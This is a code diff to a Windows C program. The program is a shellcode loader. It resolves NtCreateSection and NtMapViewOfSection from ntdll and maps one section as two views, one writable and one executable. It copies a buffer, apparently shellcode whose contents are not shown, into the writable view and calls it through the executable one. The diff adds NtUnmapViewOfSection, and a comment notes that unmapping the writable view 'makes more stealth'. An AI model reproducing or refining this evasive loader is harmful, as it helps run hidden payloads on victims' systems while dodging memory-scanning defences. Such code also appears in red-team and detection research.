@@ -3,6 +3,7 @@
 
 typedef NTSTATUS(NTAPI* d_NtCreateSection)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, void*, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributes, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
 typedef NTSTATUS(NTAPI* d_NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+typedef NTSTATUS(NTAPI* d_NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);
 
 int main(){
     //messagebox
@@ -33,16 +34,18 @@ int main(){
 
     d_NtCreateSection fNtCreateSection = (d_NtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
     d_NtMapViewOfSection fNtMapViewOfSection = (d_NtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
+    d_NtUnmapViewOfSection fNtUnmapViewOfSection = (d_NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
     SIZE_T size = 4096;
     LARGE_INTEGER sectionSize = { size };
     HANDLE sectionHandle = NULL;
     PVOID rwa = NULL;
     PVOID rxa = NULL;
-
     fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rwa, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);	
-    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rxa, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);	
+    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rwa, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
+    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rxa, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
     memcpy(rwa, buf, sizeof(buf));
+    //you can uncomment this if you want to lose write access, makes more stealth
+    //fNtUnmapViewOfSection(GetCurrentProcess(), rwa);
     printf("%p %p\n", rwa, rxa);
     ((void(*)())rxa)();
     return 0;
